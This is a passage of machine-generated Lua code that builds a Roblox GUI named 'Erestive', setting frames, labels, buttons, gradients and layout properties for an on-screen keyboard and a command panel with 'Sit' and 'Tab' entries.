-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.4.UIStroke.rainbow
G2L["9b"] = Instance.new("UIGradient", G2L["99"]);
G2L["9b"]["Rotation"] = -22;
G2L["9b"]["Name"] = [[rainbow]];
G2L["9b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.200, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.400, Color3.fromRGB(0, 226, 0)),ColorSequenceKeypoint.new(0.600, Color3.fromRGB(0, 255, 255)),ColorSequenceKeypoint.new(0.800, Color3.fromRGB(0, 0, 226)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 226))};


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.UIPadding
G2L["9c"] = Instance.new("UIPadding", G2L["8b"]);
G2L["9c"]["PaddingRight"] = UDim.new(0.01, 0);
G2L["9c"]["PaddingLeft"] = UDim.new(0.01, 0);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key1
G2L["9d"] = Instance.new("Frame", G2L["70"]);
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["Size"] = UDim2.new(1, 0, 0.2648, 0);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Name"] = [[Key1]];
G2L["9d"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.UIPadding
G2L["9e"] = Instance.new("UIPadding", G2L["9d"]);
G2L["9e"]["PaddingRight"] = UDim.new(0.01, 0);
G2L["9e"]["PaddingLeft"] = UDim.new(0.01, 0);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.2
G2L["9f"] = Instance.new("TextLabel", G2L["9d"]);
G2L["9f"]["TextWrapped"] = true;
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["TextSize"] = 14;
G2L["9f"]["TextScaled"] = true;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9f"]["BackgroundTransparency"] = 1;
G2L["9f"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Text"] = [[W]];
G2L["9f"]["Name"] = [[2]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.2.LocalScript
G2L["a0"] = Instance.new("LocalScript", G2L["9f"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.2.UIStroke
G2L["a1"] = Instance.new("UIStroke", G2L["9f"]);
G2L["a1"]["Enabled"] = false;
G2L["a1"]["Thickness"] = 5;
G2L["a1"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.2.UIStroke.randbows
G2L["a2"] = Instance.new("LocalScript", G2L["a1"]);
G2L["a2"]["Name"] = [[randbows]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.2.UIStroke.rainbow
G2L["a3"] = Instance.new("UIGradient", G2L["a1"]);
G2L["a3"]["Rotation"] = -22;
G2L["a3"]["Name"] = [[rainbow]];
G2L["a3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.200, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.400, Color3.fromRGB(0, 226, 0)),ColorSequenceKeypoint.new(0.600, Color3.fromRGB(0, 255, 255)),ColorSequenceKeypoint.new(0.800, Color3.fromRGB(0, 0, 226)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 226))};


-- StarterGui.Erestive.Keyboard.ImageLabel.Key1.UIGridLayout
G2L["a4"] = Instance.new("UIGridLayout", G2L["9d"]);
G2L["a4"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["a4"]["CellSize"] = UDim2.new(0, 60, 0, 60);


-- StarterGui.Erestive.MainFrame
G2L["a5"] = Instance.new("Frame", G2L["1"]);
G2L["a5"]["ZIndex"] = 999999991;
G2L["a5"]["BorderSizePixel"] = 0;
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 13);
G2L["a5"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["a5"]["Size"] = UDim2.new(0.46752, 0, 0.50463, 0);
G2L["a5"]["Position"] = UDim2.new(0.2422, 0, 0.34916, 0);
G2L["a5"]["Name"] = [[MainFrame]];
G2L["a5"]["BackgroundTransparency"] = 0.15;


-- StarterGui.Erestive.MainFrame.CommandFrame
G2L["a6"] = Instance.new("Frame", G2L["a5"]);
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["Size"] = UDim2.new(0.78176, -20, 0.99278, -20);
G2L["a6"]["Position"] = UDim2.new(0.25, 0, 0.04182, 0);
G2L["a6"]["Name"] = [[CommandFrame]];
G2L["a6"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1
G2L["a7"] = Instance.new("ScrollingFrame", G2L["a6"]);
G2L["a7"]["Visible"] = false;
G2L["a7"]["Active"] = true;
G2L["a7"]["ZIndex"] = 3;
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["Name"] = [[Frame1]];
G2L["a7"]["ScrollBarImageTransparency"] = 1;
G2L["a7"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["a7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["a7"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["ScrollBarThickness"] = 0;
G2L["a7"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.UIGridLayout
G2L["a8"] = Instance.new("UIGridLayout", G2L["a7"]);
G2L["a8"]["CellSize"] = UDim2.new(0, 170, 0, 40);
G2L["a8"]["CellPadding"] = UDim2.new(0, 10, 0, 30);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.UIPadding
G2L["a9"] = Instance.new("UIPadding", G2L["a7"]);
G2L["a9"]["PaddingTop"] = UDim.new(0, 5);
G2L["a9"]["PaddingRight"] = UDim.new(0, 5);
G2L["a9"]["PaddingLeft"] = UDim.new(0, 5);
G2L["a9"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame
G2L["aa"] = Instance.new("Frame", G2L["a7"]);
G2L["aa"]["BorderSizePixel"] = 0;
G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["aa"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["aa"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["aa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["aa"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.UIListLayout
G2L["ab"] = Instance.new("UIListLayout", G2L["aa"]);
G2L["ab"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit
G2L["ac"] = Instance.new("Frame", G2L["aa"]);
G2L["ac"]["BorderSizePixel"] = 0;
G2L["ac"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["ac"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["ac"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["ac"]["Name"] = [[sit]];
G2L["ac"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.Text
G2L["ad"] = Instance.new("TextLabel", G2L["ac"]);
G2L["ad"]["TextWrapped"] = true;
G2L["ad"]["ZIndex"] = 9;
G2L["ad"]["TextSize"] = 14;
G2L["ad"]["TextScaled"] = true;
G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ad"]["BackgroundTransparency"] = 1;
G2L["ad"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["ad"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ad"]["Text"] = [[Sit]];
G2L["ad"]["Name"] = [[Text]];
G2L["ad"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.WhiteBar
G2L["ae"] = Instance.new("Frame", G2L["ac"]);
G2L["ae"]["BorderSizePixel"] = 0;
G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ae"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["ae"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["ae"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ae"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.WhiteBar.UIGradient
G2L["af"] = Instance.new("UIGradient", G2L["ae"]);
G2L["af"]["Rotation"] = 90;
G2L["af"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.UICorner
G2L["b0"] = Instance.new("UICorner", G2L["ac"]);
G2L["b0"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig
G2L["b1"] = Instance.new("Frame", G2L["ac"]);
G2L["b1"]["BorderSizePixel"] = 0;
G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["b1"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["b1"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["b1"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.UICorner
G2L["b2"] = Instance.new("UICorner", G2L["b1"]);
G2L["b2"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV
G2L["b3"] = Instance.new("Frame", G2L["b1"]);
G2L["b3"]["ZIndex"] = 2;
G2L["b3"]["BorderSizePixel"] = 0;
G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["b3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b3"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Animations
G2L["b4"] = Instance.new("LocalScript", G2L["b3"]);
G2L["b4"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Animations.Sample
G2L["b5"] = Instance.new("ImageLabel", G2L["b4"]);
G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b5"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["b5"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["b5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b5"]["BackgroundTransparency"] = 1;
G2L["b5"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.UICorner
G2L["b6"] = Instance.new("UICorner", G2L["b3"]);
G2L["b6"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Button
G2L["b7"] = Instance.new("TextButton", G2L["b3"]);
G2L["b7"]["TextWrapped"] = true;
G2L["b7"]["TextSize"] = 14;
G2L["b7"]["TextScaled"] = true;
G2L["b7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["b7"]["BackgroundTransparency"] = 1;
G2L["b7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["b7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["b7"]["Text"] = [[ ]];
G2L["b7"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Button.LocalScript
G2L["b8"] = Instance.new("LocalScript", G2L["b7"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Button.Animations
G2L["b9"] = Instance.new("LocalScript", G2L["b7"]);
G2L["b9"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.Text
G2L["ba"] = Instance.new("TextLabel", G2L["b3"]);
G2L["ba"]["TextWrapped"] = true;
G2L["ba"]["ZIndex"] = 9;
G2L["ba"]["TextSize"] = 14;
G2L["ba"]["TextScaled"] = true;
G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ba"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["ba"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ba"]["BackgroundTransparency"] = 1;
G2L["ba"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["ba"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ba"]["Text"] = [[Sit]];
G2L["ba"]["Name"] = [[Text]];
G2L["ba"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.SetFOV.UIGradient
G2L["bb"] = Instance.new("UIGradient", G2L["b3"]);
G2L["bb"]["Rotation"] = -90;
G2L["bb"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.FOVConfig.FOVSet
G2L["bc"] = Instance.new("TextBox", G2L["b1"]);
G2L["bc"]["Visible"] = false;
G2L["bc"]["Name"] = [[FOVSet]];
G2L["bc"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["bc"]["TextWrapped"] = true;
G2L["bc"]["TextSize"] = 14;
G2L["bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bc"]["TextScaled"] = true;
G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["bc"]["PlaceholderText"] = [[16 - classic]];
G2L["bc"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["bc"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["bc"]["Text"] = [[]];
G2L["bc"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.sit.UIGradient
G2L["bd"] = Instance.new("UIGradient", G2L["ac"]);
G2L["bd"]["Rotation"] = -90;
G2L["bd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame
G2L["be"] = Instance.new("Frame", G2L["a7"]);
G2L["be"]["BorderSizePixel"] = 0;
G2L["be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["be"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["be"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["be"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.UIListLayout
G2L["bf"] = Instance.new("UIListLayout", G2L["be"]);
G2L["bf"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night
G2L["c0"] = Instance.new("Frame", G2L["be"]);
G2L["c0"]["BorderSizePixel"] = 0;
G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["c0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["c0"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["c0"]["Name"] = [[night]];
G2L["c0"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.Text
G2L["c1"] = Instance.new("TextLabel", G2L["c0"]);
G2L["c1"]["TextWrapped"] = true;
G2L["c1"]["ZIndex"] = 9;
G2L["c1"]["TextSize"] = 14;
G2L["c1"]["TextScaled"] = true;
G2L["c1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c1"]["BackgroundTransparency"] = 1;
G2L["c1"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["c1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c1"]["Text"] = [[Tab]];
G2L["c1"]["Name"] = [[Text]];
G2L["c1"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar
G2L["c2"] = Instance.new("Frame", G2L["c0"]);
G2L["c2"]["BorderSizePixel"] = 0;
G2L["c2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c2"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["c2"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["c2"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c2"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar.UIGradient
G2L["c3"] = Instance.new("UIGradient", G2L["c2"]);
G2L["c3"]["Rotation"] = 90;
G2L["c3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UICorner
G2L["c4"] = Instance.new("UICorner", G2L["c0"]);
G2L["c4"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig
G2L["c5"] = Instance.new("Frame", G2L["c0"]);
G2L["c5"]["BorderSizePixel"] = 0;
G2L["c5"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["c5"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["c5"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["c5"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UICorner
G2L["c6"] = Instance.new("UICorner", G2L["c5"]);
G2L["c6"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["c7"] = Instance.new("Frame", G2L["c5"]);
G2L["c7"]["ZIndex"] = 2;
G2L["c7"]["BorderSizePixel"] = 0;
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(0, 43, 6);
G2L["c7"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["c7"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["c7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c7"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["c8"] = Instance.new("LocalScript", G2L["c7"]);
G2L["c8"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["c9"] = Instance.new("ImageLabel", G2L["c8"]);
G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c9"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["c9"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["c9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["c9"]["BackgroundTransparency"] = 1;
G2L["c9"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["ca"] = Instance.new("UICorner", G2L["c7"]);
G2L["ca"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["cb"] = Instance.new("TextButton", G2L["c7"]);
G2L["cb"]["TextWrapped"] = true;
G2L["cb"]["TextSize"] = 14;
G2L["cb"]["TextScaled"] = true;
G2L["cb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["cb"]["BackgroundTransparency"] = 1;
G2L["cb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["cb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["cb"]["Text"] = [[ ]];
G2L["cb"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["cc"] = Instance.new("LocalScript", G2L["cb"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["cd"] = Instance.new("TextLabel", G2L["c7"]);
G2L["cd"]["TextWrapped"] = true;
G2L["cd"]["ZIndex"] = 9;
G2L["cd"]["TextSize"] = 14;
G2L["cd"]["TextScaled"] = true;
G2L["cd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cd"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["cd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cd"]["BackgroundTransparency"] = 1;
G2L["cd"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["cd"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["cd"]["Text"] = [[Visible]];
G2L["cd"]["Name"] = [[Text]];
G2L["cd"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["ce"] = Instance.new("UIGradient", G2L["c7"]);
G2L["ce"]["Rotation"] = -90;
G2L["ce"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.FOVSet
G2L["cf"] = Instance.new("TextBox", G2L["c5"]);
G2L["cf"]["Visible"] = false;
G2L["cf"]["Name"] = [[FOVSet]];
G2L["cf"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["cf"]["TextWrapped"] = true;
G2L["cf"]["TextSize"] = 14;
G2L["cf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["TextScaled"] = true;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["cf"]["PlaceholderText"] = [[16 - classic]];
G2L["cf"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["cf"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["cf"]["Text"] = [[]];
G2L["cf"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UIListLayout
G2L["d0"] = Instance.new("UIListLayout", G2L["c5"]);
G2L["d0"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["d0"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["d1"] = Instance.new("Frame", G2L["c5"]);
G2L["d1"]["ZIndex"] = 2;
G2L["d1"]["BorderSizePixel"] = 0;
G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(43, 0, 0);
G2L["d1"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["d1"]["Position"] = UDim2.new(0.50773, 0, -0, 0);
G2L["d1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d1"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["d2"] = Instance.new("LocalScript", G2L["d1"]);
G2L["d2"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["d3"] = Instance.new("ImageLabel", G2L["d2"]);
G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d3"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["d3"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["d3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d3"]["BackgroundTransparency"] = 1;
G2L["d3"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["d4"] = Instance.new("UICorner", G2L["d1"]);
G2L["d4"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["d5"] = Instance.new("TextButton", G2L["d1"]);
G2L["d5"]["TextWrapped"] = true;
G2L["d5"]["TextSize"] = 14;
G2L["d5"]["TextScaled"] = true;
G2L["d5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["d5"]["BackgroundTransparency"] = 1;
G2L["d5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["d5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d5"]["Text"] = [[ ]];
G2L["d5"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["d6"] = Instance.new("LocalScript", G2L["d5"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["d7"] = Instance.new("TextLabel", G2L["d1"]);
G2L["d7"]["TextWrapped"] = true;
G2L["d7"]["ZIndex"] = 9;
G2L["d7"]["TextSize"] = 14;
G2L["d7"]["TextScaled"] = true;
G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["d7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d7"]["BackgroundTransparency"] = 1;
G2L["d7"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["d7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["d7"]["Text"] = [[Visible]];
G2L["d7"]["Name"] = [[Text]];
